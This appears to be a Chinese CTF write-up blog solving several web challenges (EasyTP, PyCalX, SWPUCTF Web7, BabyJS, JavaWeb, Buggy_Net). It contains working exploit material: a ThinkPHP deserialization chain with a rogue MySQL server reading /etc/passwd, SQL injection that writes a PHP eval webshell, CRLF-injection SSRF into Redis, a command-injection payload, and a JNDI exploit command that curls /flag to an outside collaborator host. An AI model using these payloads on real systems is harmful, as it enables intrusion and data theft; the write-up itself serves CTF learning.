open(\u0026#39;tf/detection_model/\u0026#39; + e, \u0026#39;wb\u0026#39;).write(z.read(e)) sess = renew(sess, tf_path) flash(\u0026#34;Reloaded succe sfully\u0026#34;) except Exception as e: flash(str(e)) return render_template(\u0026#39;admin.html\u0026#39;) else: return \u0026#34;Not a admin **session**. \u0026lt;a href=\u0026#39;/\u0026#39;\u0026gt;Back\u0026lt;/a\u0026gt;\u0026#34; @app.route(\u0026#39;/admin/source\u0026#39;) # \u0026lt;--here ♂ boy next door def get_source(): return open(\u0026#39;app.py\u0026#39;, encoding=\u0026#39;utf8\u0026#39;).read() @app.route(\u0026#39;/admin/source_thanos\u0026#39;) def get_source_broken(): \u0026#39;\u0026#39;\u0026#39; Thanos is eventually resurrected,[21] and collects the Infinity Gems once again.[22] He uses the gems to create the Infinity Gauntlet, making himself omnipotent, and erases half the living things in the universe to prove his love to Death. \u0026#39;\u0026#39;\u0026#39; t = open(\u0026#39;app.py\u0026#39;, encoding=\u0026#39;utf8\u0026#39;).read() tt = [t[i] for i in range(len(t))] ll = list(range(len(t))) random.shuffle(ll) for i in ll[:len(t) // 2]: if tt[i] != \u0026#39;\\n\u0026#39;: tt[i] = \u0026#39; \u0026#39; return \u0026#34;\u0026#34;.join(tt) ……tensorflow，完全不懂啊哥，你考的知识太高雅了，我俗人一个，咋就输入一个aaaaaabxCZC就有flag了啊\n作者wp\n[红明谷CTF 2021]EasyTP | tp3.2 反序列化 mysql伪服务端 sqli 报错注入 堆叠注入 脱库 tp3.2.3，有一个现成的链子：ThinkPHP v3.2.* （SQL注入\u0026amp;文件读取）反序列化POP链\n看Application\\Home\\Controller\\IndexController.class.php的代码也跟这个文章中的示例代码大差不差，顺着这篇文章的思路跟一下\n首先是全局寻找__destruct()函数\nwww/ThinkPHP/Library/Think/Image/Driver/Imagick.class.php\n寻找一个destroy()\nwww/ThinkPHP/Library/Think/Session/Driver/Memcache.class.php\n这里需要一个$sessID，PHP7下不传参会报错 PHP5不影响，$this-\u0026gt;sessionName可控；接着找含有delete()的类\nwww/ThinkPHP/Mode/Lite/Model.class.php\n相当于传入的参数都可用，可以控制自带的数据库类的delete()方法了\nwww/ThinkPHP/Library/Think/Db/Driver.class.php\n它是拼接了$sql语句，之后执行$this-\u0026gt;execute()\n它会预先进行$this-\u0026gt;initConnect()\n我们可以控制$config，控制连接任意数据库\n这里可以结合MySQL恶意服务端读客户端文件这个洞了（题目可以参考[DDCTF 2020]mysql弱口令），利用过程就是这样：\n通过某处泄露得到目标的WEB目录（如DEBUG页面 开启MySQL伪服务端，读取目标的数据库配置文件 触发反序列化 触发PDO连接部分 获取到目标的数据库配置文件 以本题为演示，使用bettercap做mysql伪服务端读一下/etc/passwd\n\u0026lt;?php namespace Think\\Db\\Driver{ use PDO; class Mysql{ protected $options = array( PDO::MYSQL_ATTR_LOCAL_INFILE =\u0026gt; true // 开启才能读取文件 ); protected $config = array( \u0026#34;debug\u0026#34; =\u0026gt; 1, \u0026#34;database\u0026#34; =\u0026gt; \u0026#34;\u0026#34;, \u0026#34;hostname\u0026#34; =\u0026gt; \u0026#34;your_vps\u0026#34;, \u0026#34;hostport\u0026#34; =\u0026gt; \u0026#34;port\u0026#34;, \u0026#34;charset\u0026#34; =\u0026gt; \u0026#34;utf8\u0026#34;, \u0026#34;username\u0026#34; =\u0026gt; \u0026#34;root\u0026#34;, \u0026#34;password\u0026#34; =\u0026gt; \u0026#34;root\u0026#34; ); } } namespace Think\\Image\\Driver{ use Think\\Session\\Driver\\Memcache; class Imagick{ private $img; public function __construct(){ $this-\u0026gt;img = new Memcache(); } } } namespace Think\\Session\\Driver{ use Think\\Model; class Memcache{ protected $handle; public function __construct(){ $this-\u0026gt;handle = new Model(); } } } namespace Think{ use Think\\Db\\Driver\\Mysql; class Model{ protected $options = array(); protected $pk; protected $data = array(); protected $db = null; public function __construct(){ $this-\u0026gt;db = new Mysql(); $this-\u0026gt;options[\u0026#39;where\u0026#39;] = \u0026#39;\u0026#39;; $this-\u0026gt;pk = \u0026#39;id\u0026#39;; $this-\u0026gt;data[$this-\u0026gt;pk] = array( \u0026#34;table\u0026#34; =\u0026gt; \u0026#34;mysql.user where 1=updatexml(1,concat(0x7e,user(),31) from test.flag),0x7e),1)#\u0026#34;, \u0026#34;where\u0026#34; =\u0026gt; \u0026#34;1=1\u0026#34; ); } } } namespace { echo base64_encode(serialize(new Think\\Image\\Driver\\Imagick())); $curl = curl_init(); curl_setopt_array($curl, array( CURLOPT_URL =\u0026gt; \u0026#34;http://6382172d-0bab-4e87-b434-7d711efad721.node3.buuoj.cn/\u0026#34;, CURLOPT_RETURNTRANSFER =\u0026gt; true, CURLOPT_ENCODING =\u0026gt; \u0026#34;\u0026#34;, CURLOPT_MAXREDIRS =\u0026gt; 10, CURLOPT_TIMEOUT =\u0026gt; 3, CURLOPT_HTTP_VERSION =\u0026gt; CURL_HTTP_VERSION_1_1, CURLOPT_CUSTOMREQUEST =\u0026gt; \u0026#34;POST\u0026#34;, CURLOPT_POSTFIELDS =\u0026gt; base64_encode(serialize(new Think\\Image\\Driver\\Imagick())), CURLOPT_HTTPHEADER =\u0026gt; array( \u0026#34;Postman-Token: 348e180e-5893-4ab4-b1d4-f570d69f228e\u0026#34;, \u0026#34;cache-control: no-cache\u0026#34; ), )); $response = curl_exec($curl); $err = curl_error($curl); curl_close($curl); if ($err) { echo \u0026#34;cURL Error #:\u0026#34; . $err; } else { echo $response; } } 看到了mysql用户，弱口令密码root\n之后就可以把我们的伪服务端撤了，换成真服务端的，进行一个注入\n使用目标的数据库配置再次进行反序列化 触发DELETE语句的SQL注入 $this-\u0026gt;data[$this-\u0026gt;pk] = array( // \u0026#34;table\u0026#34; =\u0026gt; \u0026#34;mysql.user where 1=updatexml(1,concat(0x7e,(select left(group_concat(schema_name),31) from information_schema.SCHEMATA)),1)#\u0026#34;, // \u0026#34;table\u0026#34; =\u0026gt; \u0026#34;mysql.user where 1=updatexml(1,concat(0x7e,(select right(group_concat(schema_name),31) from information_schema.SCHEMATA)),1)#\u0026#34;, // \u0026#34;table\u0026#34; =\u0026gt; \u0026#34;mysql.user where 1=updatexml(1,concat(0x7e,(select left(group_concat(table_name),31) from information_schema.tables where table_schema=\u0026#39;test\u0026#39;),0x7e),1)#\u0026#34;, // \u0026#34;table\u0026#34; =\u0026gt; \u0026#34;mysql.user where 1=updatexml(1,concat(0x7e,(select left(group_concat(column_name),31) from information_schema.columns where table_schema=\u0026#39;test\u0026#39;),0x7e),1)#\u0026#34;, // \u0026#34;table\u0026#34; =\u0026gt; \u0026#34;mysql.user where 1=updatexml(1,concat(0x7e,(select left(group_concat(flag),31) from test.flag),0x7e),1)#\u0026#34;, \u0026#34;table\u0026#34; =\u0026gt; \u0026#34;mysql.user where 1=updatexml(1,concat(0x7e,(select right(group_concat(flag),31) from test.flag),0x7e),1)#\u0026#34;, \u0026#34;where\u0026#34; =\u0026gt; \u0026#34;1=1\u0026#34; ); 我们还可以把堆叠打开，用堆叠注入写shell，也就是本题的exp（参考赵总的exp 赵总牛逼\n\u0026lt;?php namespace Think\\Db\\Driver{ use PDO; class Mysql{ protected $options = array( PDO::MYSQL_ATTR_LOCAL_INFILE =\u0026gt; true , // 开启才能读取文件 PDO::MYSQL_ATTR_MULTI_STATEMENTS =\u0026gt; true, // 打开堆叠注入 ); protected $config = array( \u0026#34;debug\u0026#34; =\u0026gt; 1, \u0026#34;database\u0026#34; =\u0026gt; \u0026#34;\u0026#34;, \u0026#34;hostname\u0026#34; =\u0026gt; \u0026#34;127.0.0.1\u0026#34;, \u0026#34;hostport\u0026#34; =\u0026gt; \u0026#34;3306\u0026#34;, \u0026#34;charset\u0026#34; =\u0026gt; \u0026#34;utf8\u0026#34;, \u0026#34;username\u0026#34; =\u0026gt; \u0026#34;root\u0026#34;, // 猜出弱口令 \u0026#34;password\u0026#34; =\u0026gt; \u0026#34;root\u0026#34; ); } } namespace Think\\Image\\Driver{ use Think\\Session\\Driver\\Memcache; class Imagick{ private $img; public function __construct(){ $this-\u0026gt;img = new Memcache(); } } } namespace Think\\Session\\Driver{ use Think\\Model; class Memcache{ protected $handle; public function __construct(){ $this-\u0026gt;handle = new Model(); } } } namespace Think{ use Think\\Db\\Driver\\Mysql; class Model{ protected $options = array(); protected $pk; protected $data = array(); protected $db = null; public function __construct(){ $this-\u0026gt;db = new Mysql(); $this-\u0026gt;options[\u0026#39;where\u0026#39;] = \u0026#39;\u0026#39;; $this-\u0026gt;pk = \u0026#39;id\u0026#39;; $this-\u0026gt;data[$this-\u0026gt;pk] = array( // 堆叠注入写入shell \u0026#34;table\u0026#34; =\u0026gt; \u0026#34;mysql.user where 1=1;select \u0026#39;\u0026lt;?php eval(\\$_POST[amiz]);?\u0026gt;\u0026#39; into outfile \u0026#39;/var/www/html/amiz.php\u0026#39;;#\u0026#34;, \u0026#34;where\u0026#34; =\u0026gt; \u0026#34;1=1\u0026#34; ); } } } namespace { echo base64_encode(serialize(new Think\\Image\\Driver\\Imagick())); $curl = curl_init(); curl_setopt_array($curl, array( CURLOPT_URL =\u0026gt; \u0026#34;http://914146f1-7d08-4a0a-9659-c143df1d68e1.node4.buuoj.cn:81/\u0026#34;, CURLOPT_RETURNTRANSFER =\u0026gt; true, CURLOPT_ENCODING =\u0026gt; \u0026#34;\u0026#34;, CURLOPT_MAXREDIRS =\u0026gt; 10, CURLOPT_TIMEOUT =\u0026gt; 3, CURLOPT_HTTP_VERSION =\u0026gt; CURL_HTTP_VERSION_1_1, CURLOPT_CUSTOMREQUEST =\u0026gt; \u0026#34;POST\u0026#34;, CURLOPT_POSTFIELDS =\u0026gt; base64_encode(serialize(new Think\\Image\\Driver\\Imagick())), CURLOPT_HTTPHEADER =\u0026gt; array( \u0026#34;cache-control: no-cache\u0026#34; ), )); $response = curl_exec($curl); $err = curl_error($curl); curl_close($curl); if ($err) { echo \u0026#34;cURL Error #:\u0026#34; . $err; } else { echo $response; } } 其中curl的代码是用postman生成的 ~~（postman打钱）~~一套连招直接带走，用蚁剑连接之后发现根目录下没有flag，反而是一个flag.sh\n我们还得连上数据库看看\n但是蚁剑自带的添加失败，直接手动写一个冰蝎的🐎\n直接查看也是没有，但是可以用它的导出数据库的功能得到数据\n参考：wp1 wp2\nPyCalX 1\u0026amp;2 | 首先是1\n#!/usr/bin/env python3 import cgi; import sys from html import escape FLAG = open(\u0026#39;/var/www/flag\u0026#39;,\u0026#39;r\u0026#39;).read() OK_200 = \u0026#34;\u0026#34;\u0026#34;Content-type: text/html \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; href=\u0026#34;https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css\u0026#34;\u0026gt; \u0026lt;center\u0026gt; \u0026lt;title\u0026gt;PyCalx\u0026lt;/title\u0026gt; \u0026lt;h1\u0026gt;PyCalx\u0026lt;/h1\u0026gt; \u0026lt;form\u0026gt; \u0026lt;input class=\u0026#34;form-control col-md-4\u0026#34; type=text name=value1 placeholder=\u0026#39;Value 1 (Example: 1 abc)\u0026#39; autofocus/\u0026gt; \u0026lt;input class=\u0026#34;form-control col-md-4\u0026#34; type=text name=op placeholder=\u0026#39;Operator (Example: + - * ** / // == != )\u0026#39; /\u0026gt; \u0026lt;input class=\u0026#34;form-control col-md-4\u0026#34; type=text name=value2 placeholder=\u0026#39;Value 2 (Example: 1 abc)\u0026#39; /\u0026gt; \u0026lt;input class=\u0026#34;form-control col-md-4 btn btn-success\u0026#34; type=submit value=EVAL /\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;a href=\u0026#39;?source=1\u0026#39;\u0026gt;Source\u0026lt;/a\u0026gt; \u0026lt;/center\u0026gt; \u0026#34;\u0026#34;\u0026#34; print(OK_200) arguments = cgi.FieldStorage() if \u0026#39;source\u0026#39; in arguments: source = arguments[\u0026#39;source\u0026#39;].value else: source = 0 if source == \u0026#39;1\u0026#39;: print(\u0026#39;\u0026lt;pre\u0026gt;\u0026#39;+escape(str(open(__file__,\u0026#39;r\u0026#39;).read()))+\u0026#39;\u0026lt;/pre\u0026gt;\u0026#39;) if \u0026#39;value1\u0026#39; in arguments and \u0026#39;value2\u0026#39; in arguments and \u0026#39;op\u0026#39; in arguments: def get_value(val): val = str(val)[:64] if str(val).isdigit(): return int(val) blacklist = [\u0026#39;(\u0026#39;,\u0026#39;)\u0026#39;,\u0026#39;[\u0026#39;,\u0026#39;]\u0026#39;,\u0026#39;\\\u0026#39;\u0026#39;,\u0026#39;\u0026#34;\u0026#39;] # I don\u0026#39;t like tuple, list and dict. if val == \u0026#39;\u0026#39; or [c for c in blacklist if c in val] != []: print(\u0026#39;\u0026lt;center\u0026gt;Invalid value\u0026lt;/center\u0026gt;\u0026#39;) sys.exit(0) return val def get_op(val): val = str(val)[:2] list_ops = [\u0026#39;+\u0026#39;,\u0026#39;-\u0026#39;,\u0026#39;/\u0026#39;,\u0026#39;*\u0026#39;,\u0026#39;=\u0026#39;,\u0026#39;!\u0026#39;] if val == \u0026#39;\u0026#39; or val[0] not in list_ops: print(\u0026#39;\u0026lt;center\u0026gt;Invalid op\u0026lt;/center\u0026gt;\u0026#39;) sys.exit(0) return val op = get_op(arguments[\u0026#39;op\u0026#39;].value) value1 = get_value(arguments[\u0026#39;value1\u0026#39;].value) value2 = get_value(arguments[\u0026#39;value2\u0026#39;].value) if str(value1).isdigit() ^ str(value2).isdigit(): print(\u0026#39;\u0026lt;center\u0026gt;Types of the values don\\\u0026#39;t match\u0026lt;/center\u0026gt;\u0026#39;) sys.exit(0) calc_eval = str(repr(value1)) + str(op) + str(repr(value2)) print(\u0026#39;\u0026lt;div class=container\u0026gt;\u0026lt;div class=row\u0026gt;\u0026lt;div class=col-md-2\u0026gt;\u0026lt;/div\u0026gt;\u0026lt;div class=\u0026#34;col-md-8\u0026#34;\u0026gt;\u0026lt;pre\u0026gt;\u0026#39;) print(\u0026#39;\u0026gt;\u0026gt;\u0026gt;\u0026gt; print(\u0026#39;+escape(calc_eval)+\u0026#39;)\u0026#39;) try: result = str(eval(calc_eval)) if result.isdigit() or result == \u0026#39;True\u0026#39; or result == \u0026#39;False\u0026#39;: print(result) else: print(\u0026#34;Invalid\u0026#34;) # Sorry we don\u0026#39;t support output as a string due to security issue. except: print(\u0026#34;Invalid\u0026#34;) print(\u0026#39;\u0026gt;\u0026gt;\u0026gt; \u0026lt;/pre\u0026gt;\u0026lt;/div\u0026gt;\u0026lt;/div\u0026gt;\u0026lt;/div\u0026gt;\u0026#39;) 是实现了一个计算器（除了数字还可以运算字符串），但是对参数的过滤上并不严谨\n忘了使用get_value函数了，导致我们可以用黑名单里面的运算符的，用类似char-by-char-sqli的方式盲注出flag（因为没有回显），我们可控的变量是source（作用域是全局）\nimport requests import urllib import string url=\u0026#34;http://eabb9a29-a56e-461e-a0a8-7953b6c243c5.node4.buuoj.cn:81/cgi-bin/pycalx.py?source={0}\u0026amp;value1={1}\u0026amp;op={2}\u0026amp;value2={3}\u0026#34; flag=\u0026#34;\u0026#34; source=\u0026#34;\u0026#34; value1=urllib.parse.quote(\u0026#34;WQERGFD\u0026#34;) op=urllib.parse.quote(\u0026#34;+\u0026#39;\u0026#34;) value2=urllib.parse.quote(\u0026#34; and FLAG\u0026gt;source#\u0026#34;) while True: prev = 0 for i in range(255): if chr(i) in string.printable: source=flag+chr(prev) source=urllib.parse.quote(source) result=requests.get(url.format(source,value1,op,value2)).text #print(result) if \u0026#34;False\u0026#34; in result and \u0026#34;security\u0026#34; not in result: flag+=chr(prev-1) print(flag) break else: prev=i 看着跟sqli很像，是字符串进行比较，python默认比完第一位比第二位，所以不需要sqli那样指名第几位那样，注入可以普通for\nimport requests from requests.api import get from requests.utils import quote import string url = \u0026#39;http://eabb9a29-a56e-461e-a0a8-7953b6c243c5.node4.buuoj.cn:81/cgi-bin/pycalx.py?source={0}\u0026amp;value1={1}\u0026amp;op={2}\u0026amp;value2={3}\u0026#39; flag = \u0026#39;\u0026#39; source = \u0026#39;\u0026#39; value1 = quote(\u0026#39;WQERGFD\u0026#39;) op = quote(\u0026#34;+\u0026#39;\u0026#34;) value2 = quote(\u0026#39; and FLAG\u0026gt;source#\u0026#39;) while True: prev = 0 for i in range(45): if chr(i) in string.printable: source = flag + chr(prev) source = quote(source) resp = requests.get(url.format(source, value1, value2)).text if \u0026#39;False\u0026#39; in resp and \u0026#39;security\u0026#39; not in resp: flag += chr(prev - 1) print(flag) break else: prev = i 也可以二分（感觉自己之前写的二分法的脚本应该解耦了，不然遇到这种情况的话需要改的地方就太多了，应该改成一些函数的集合体 就像这个大佬的一样\nimport requests, re def calc(v1, v2, op, s): u = \u0026#34;http://178.128.96.203/cgi-bin/server.py?\u0026#34; payload = dict(value1=v1, value2=v2, op=op, source=s) # print payload r = requests.get(u, params=payload) # print r.url res = re.findall(\u0026#34;\u0026lt;pre\u0026gt;\\n\u0026gt;\u0026gt;\u0026gt;\u0026gt;([\\s\\S]*)\\n\u0026gt;\u0026gt;\u0026gt; \u0026lt;\\/pre\u0026gt;\u0026#34;, r.content)[0].split(\u0026#39;\\n\u0026#39;)[1] assert (res != \u0026#39;Invalid\u0026#39;) return res == \u0026#39;True\u0026#39; # print r.content def check(mid): s = flag + chr(mid) return calc(v1, v2, op, s) def bin_search(seq=xrange(0x20, 0x80), lo=0, hi=None): assert (lo \u0026gt;= 0) if hi == None: hi = len(seq) while lo \u0026lt; hi: mid = (lo + hi) // 2 # print lo, mid, hi, \u0026#34;\\t\u0026#34;, if check(seq[mid]): hi = mid else: lo = mid + 1 return seq[lo] flag = \u0026#39;\u0026#39; v1, v2, op, s = \u0026#39;x\u0026#39;, \u0026#34;+FLAG\u0026lt;value1+source#\u0026#34;, \u0026#34;+\u0026#39;\u0026#34;, \u0026#39;\u0026#39; while (1): flag += chr(bin_search() - 1) print flag ————————下面是pycalx2\n把上面的op那里也加了get_value函数\n不能用单引号了，这里考的地方是f-string的特性，可以直接插入运算表达式，不过要改一下脚本的思路\nf\u0026#34;{Flag\u0026gt;source or \u0026#39;e\u0026#39;}\u0026#34; 如果成功输出1，不成功输出e，拼接上前面的Tru，成功为Tru1，不成功为True\nimport requests import urllib import string url=\u0026#34;http://192.168.60.131/cgi-bin/py.py?source={0}\u0026amp;value1={1}\u0026amp;op={2}\u0026amp;value2={3}\u0026#34; flag=\u0026#34;\u0026#34; source=\u0026#34;\u0026#34; value1=urllib.parse.quote(\u0026#34;T\u0026#34;) op=urllib.parse.quote(\u0026#34;+f\u0026#34;) value2=urllib.parse.quote(\u0026#34;ru{FLAG\u0026gt;source or 14:x}\u0026#34;) while True: prev = 0 for i in range(255): if chr(i) in string.printable: source=flag+chr(prev) source=urllib.parse.quote(source) result=requests.get(url.format(source,value1,op,value2)).text #print(result) if \u0026#34;True\u0026#34; in result and \u0026#34;security\u0026#34; not in result: flag+=chr(prev-1) print(flag) break else: prev=i import requests, re def calc(v1, v2, op, s): u = \u0026#34;http://206.189.223.3/cgi-bin/server.py?\u0026#34; payload = dict(value1=v1, value2=v2, op=op, source=s) r = requests.get(u, params=payload) res = re.findall(\u0026#34;\u0026lt;pre\u0026gt;\\n\u0026gt;\u0026gt;\u0026gt;\u0026gt;([\\s\\S]*)\\n\u0026gt;\u0026gt;\u0026gt; \u0026lt;\\/pre\u0026gt;\u0026#34;, r.content)[0].split(\u0026#39;\\n\u0026#39;)[1] return res == \u0026#39;Invalid\u0026#39; def check(mid): s = flag + chr(mid) return calc(v1, v2, op, s) def bin_search(seq=xrange(0x20, 0x80), lo=0, hi=None): assert (lo \u0026gt;= 0) if hi == None: hi = len(seq) while lo \u0026lt; hi: mid = (lo + hi) // 2 if check(seq[mid]): hi = mid else: lo = mid + 1 return seq[lo] flag = \u0026#39;\u0026#39; v1, op, v2, s = \u0026#39;T\u0026#39;, \u0026#34;+f\u0026#34;, \u0026#34;ru{FLAG\u0026lt;source or 14:x}\u0026#34;, \u0026#39;a\u0026#39; while (1): flag += chr(bin_search() - 1) print flag 只用把上面的payload稍微魔改一下就行，value1=T, op=+f, value2=re{Flag\u0026lt;source or 14:x}, source=xxxx，传参的时候不用加引号，因为它在题目中运算的时候会自己加上的\n参考：wp | wp2\n[SWPUCTF 2016]Web7 robots.txt的报错显示这是py2.7，并且有一个第三方库cherrypy17.4.2，首页是输入框，要求输入一个url，之后可以返回发出请求的信息，下面还有一个login输入密码登入admin，无弱口令\n看源码的时候直接看到docker了，考点是cve-2016-5699和redis ssrf\n#!/usr/bin/python # coding:utf8 __author__ = \u0026#39;niexinming\u0026#39; import cherrypy import urllib2 import redis class web7: @cherrypy.expose def index(self): return \u0026#34;\u0026lt;script\u0026gt; window.location.href=\u0026#39;/input\u0026#39;;\u0026lt;/script\u0026gt;\u0026#34; @cherrypy.expose def input(self,url=\u0026#34;\u0026#34;,submit=\u0026#34;\u0026#34;): file=open(\u0026#34;index.html\u0026#34;,\u0026#34;r\u0026#34;).read() reheaders=\u0026#34;\u0026#34; if cherrypy.request.method==\u0026#34;GET\u0026#34;: reheaders=\u0026#34;\u0026#34; else: url=cherrypy.request.params[\u0026#34;url\u0026#34;] submit=cherrypy.request.params[\u0026#34;submit\u0026#34;] try: for x in urllib2.urlopen(url).info().headers: reheaders=reheaders+x+\u0026#34;\u0026lt;br\u0026gt;\u0026#34; except Exception,e: reheaders=\u0026#34;错误\u0026#34;+str(e) for x in urllib2.urlopen(url).info().headers: reheaders=reheaders+x+\u0026#34;\u0026lt;br\u0026gt;\u0026#34; file=file.replace(\u0026#34;\u0026lt;?response?\u0026gt;\u0026#34;,reheaders) return file @cherrypy.expose def login(self,password=\u0026#34;\u0026#34;,submit=\u0026#34;\u0026#34;): pool = redis.ConnectionPool(host=\u0026#39;127.0.0.1\u0026#39;, port=6379) r = redis.Redis(connection_pool=pool) re=\u0026#34;\u0026#34; file=open(\u0026#34;login.html\u0026#34;,\u0026#34;r\u0026#34;).read() if cherrypy.request.method==\u0026#34;GET\u0026#34;: re=\u0026#34;\u0026#34; else: password=cherrypy.request.params[\u0026#34;password\u0026#34;] submit=cherrypy.request.params[\u0026#34;submit\u0026#34;] if r.get(\u0026#34;admin\u0026#34;)==password: re=open(\u0026#34;flag\u0026#34;,\u0026#39;r\u0026#39;).readline() else: re=\u0026#34;Can\u0026#39;t find admin:\u0026#34;+password+\u0026#34;,fast fast fast.....\u0026#34; file=file.replace(\u0026#34;\u0026lt;?response?\u0026gt;\u0026#34;,re) return file cherrypy.config.update({\u0026#39;server.socket_host\u0026#39;: \u0026#39;0.0.0.0\u0026#39;, \u0026#39;server.socket_port\u0026#39;: 8080, }) cherrypy.quickstart(web7(),\u0026#39;/\u0026#39;) 使用的urllib2.urlopen库只支持http https ftp file这几种schema，不能用gopher，但是有个cve（和上周搞的nodejs的那个有点像），它在处理url的时候没有考虑换行符，所以我们可以在正常的http头中插入任意内容\n真的跟nodejs那个很像，node那个还多一个介质（处理unicode字符时转化出问题），所以我们只要向redis中写入输入改掉admin密码就行了\nhttp://127.0.0.1%0d%0aset%20admin%20admin%0d%0asave%0d%0a:6379/amiz 参考：wp\n[网鼎杯 2020 半决赛]BabyJS 是express框架，cookie的session字段初始是{\u0026quot;admin\u0026quot;:\u0026quot;no\u0026quot;}，改为yes后还是会重定向回来；然后发现自己眼瞎没看见附件，我的；详细的路由代码在index.js，看到blacklist就有SSRF的既视感了\nvar express = require(\u0026#39;express\u0026#39;); var config = require(\u0026#39;../config\u0026#39;); var url=require(\u0026#39;url\u0026#39;); var child_process=require(\u0026#39;child_process\u0026#39;); var fs=require(\u0026#39;fs\u0026#39;); var request=require(\u0026#39;request\u0026#39;); var router = express.Router(); var blacklist=[\u0026#39;127.0.0.1.xip.io\u0026#39;,\u0026#39;::ffff:127.0.0.1\u0026#39;,\u0026#39;127.0.0.1\u0026#39;,\u0026#39;0\u0026#39;,\u0026#39;localhost\u0026#39;,\u0026#39;0.0.0.0\u0026#39;,\u0026#39;[::1]\u0026#39;,\u0026#39;::1\u0026#39;]; router.get(\u0026#39;/\u0026#39;, function(req, res, next) { res.json({}); }); router.get(\u0026#39;/debug\u0026#39;, function(req, res, next) { console.log(req.ip); if(blacklist.indexOf(req.ip)!=-1){\t// req.ip在黑名单中 console.log(\u0026#39;res\u0026#39;); var u=req.query.url.replace(/[\\\u0026#34;\\\u0026#39;]/ig,\u0026#39;\u0026#39;); console.log(url.parse(u).href); let log=`echo \u0026#39;${url.parse(u).href}\u0026#39;\u0026gt;\u0026gt;/tmp/log`; console.log(log); child_process.exec(log);\t// 命令执行 res.json({data:fs.readFileSync(\u0026#39;/tmp/log\u0026#39;).toString()}); }else{ res.json({}); } }); router.post(\u0026#39;/debug\u0026#39;, function(req, res, next) { console.log(req.body); if(req.body.url !== undefined) { var u = req.body.url;\t// POST url参数 var urlObject=url.parse(u);\t// 对url进行parse if(blacklist.indexOf(urlObject.hostname) == -1){\t// hostname不在黑名单中 var dest=urlObject.href; request(dest,(err,result,body)=\u0026gt;{\t// 访问 目标 res.json(body); }) } else{ res.json([]); } } }); module.exports = router; 需要构造一个ssrf的url，post方式传入并且绕过ssrf的黑名单，比如\nhttp://0177.0.0.01/\t# 八进制 http://2130706433/\t# 十进制 后面接上/debug?url=xxxx，post传入后调用request会到get /debug进行处理，就可以child_process_exec执行命令了\n执行命令的话，因为后面它会读出/tmp/log的文件，所以我们把flag写入这个文件中，用cp /flag /tmp/log\n构造payload时原代码是这样的\nlet log=`echo \u0026#39;${url.parse(u).href}\u0026#39;\u0026gt;\u0026gt;/tmp/log`; 所以先要闭合echo后面的单引号，再考虑url.parse(u).href的结果，最后用#把后面多余的注释掉；然而有个正则匹配要先过滤一下单引号\nvar u=req.query.url.replace(/[\\\u0026#34;\\\u0026#39;]/ig,\u0026#39;\u0026#39;); 所以用二次url编码：' -\u0026gt; %27 -\u0026gt; %2527加@，让url.parse().href时让@前的部分被decodeURIComponent\npayload要再编一次码\nPOST: url=http://2130706433/debug?url=http://%252527@1;cp$IFS$9/flag$IFS$9/tmp/log;%25%23 flag{876797a7-fe5f-4a11-aa1f-bd0fbcb1640e}\n[红明谷CTF 2021]JavaWeb 与强网拟态的Jack-Shiro等等题都是一样的考点，首先是一个/;/json绕过鉴权，之后是jndi注入，用那个jar一把梭\n[\u0026#34;ch.qos.logback.core.db.JNDIConnectionSource\u0026#34;,{\u0026#34;jndiLocation\u0026#34;:\u0026#34;rmi://101.35.114.107:1099/qhx0ip\u0026#34;}] java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C \u0026#34;curl http://mg6uynla2pxa8ilgp4cprm0suj09oy.burpcollaborator.net/ -F file=@/flag\u0026#34; -A \u0026#34;101.35.114.107\u0026#34; [b01lers2020]Scrambled 页面上只有一个油管视频，没有特殊的行为\n抓包看到cookie，在每一次reload（在页面底部）之后都会更新\n两个字段，frequency和transmissions\n没明白啥意思，看wp知道这里是代表了每一位flag的值，比如上面图片里的\n7-12\t-\u0026gt; 12位是`-` 前一位是`7` 0f15\t-\u0026gt; 15位是`f` 前一位是`0` 整个py脚本自动（参考wp\nimport requests import re url = \u0026#39;http://a3197079-a7bd-4d2f-847b-bad3410130b7.node4.buuoj.cn:81/\u0026#39; headers = {\u0026#39;Cookie\u0026#39;: \u0026#39;frequency=1; transmissions=kxkxkxkxsh7-12kxkxkxkxsh\u0026#39;} flag = [0] * 50 while True: r = requests.session() cookie = r.get(url, headers=headers).headers[\u0026#39;Set-Cookie\u0026#39;] # 得到下一次的cookie try: tmp = re.search(r\u0026#39;kxkxkxkxsh(.+)kxkxkxkxsh;\u0026#39;, cookie).group()[10:-11] # 匹配中间有用的部分 flag[int(tmp[2:])] = tmp[1:2] flag[int(tmp[2:]) - 1] = tmp[0:1] for i in flag: print(i, end=\u0026#39;\u0026#39;) print() except: pass flag{3e6d8ee7-40f1-40a1-b496-93c40f43c8b8}\n[极客大挑战 2020]Roamphp4-Rceme 一个命令执行的页面，需要验证码，不过这个验证码是常见考点了\nimport hashlib def func(md5_val): for x in range(999999, 100000000): md5_value=hashlib.md5(str(x).encode(encoding=\u0026#39;utf-8\u0026#39;)).hexdigest() if md5_value[:5]==md5_val: return str(x) if __name__ == \u0026#39;__main__\u0026#39;: print(func(\u0026#39;6e3f2\u0026#39;)) 命令执行的部分，直接看出题人的wp吧，用的是[~(异或)][!%FF]的形式组成字符串,然后无参数RCE\n这部分用的是异或构造的方式，emmm，上周说要总结的，但是没总结（我的，这周一定看\n参考：官方wp | wp1\n[Windows][HITCON 2019]Buggy_Net /Default.txt给出了源码，是少见的win+asp.net\nbool isBad = false; try { if ( Request.Form[\u0026#34;filename\u0026#34;] != null ) { // filename参数非空 isBad = Request.Form[\u0026#34;filename\u0026#34;].Contains(\u0026#34;..\u0026#34;) == true; // 如果filename中含有`..`为true } } catch (Exception ex) { } try { if (!isBad) { // isBad为false Response.Write(System.IO.File.ReadAllText(@\u0026#34;C:\\inetpub\\wwwroot\\\u0026#34; + Request.Form[\u0026#34;filename\u0026#34;])); // 读出filename指定的文件 } } catch (Exception ex) { } 但是当前目录在C:\\inetpub\\wwwroot\\，需要..\\进行目录穿越；这里的利用方式参考-\u0026gt;WAF Bypass Techniques - Using HTTP Standard and Web Servers’ Behaviour | wp，这里转述一下\n对于POST请求，会存在request validation来检测form表单中含有一些危险内容（比如\u0026lt;x），处理的方式是中止整个app；然而对于相同的内容，在query-string fields中会通过初始的request validation，并且仅仅在首次的Request.QueryString[...]抛出异常\n对于GET的query-string fileds也存在request validation，但是如果加一个form表单，就会产生和上述后半部分一样的效果\n所以这里我们可以提交一个GET请求（不带有get查询参数），但是依然含有body部分 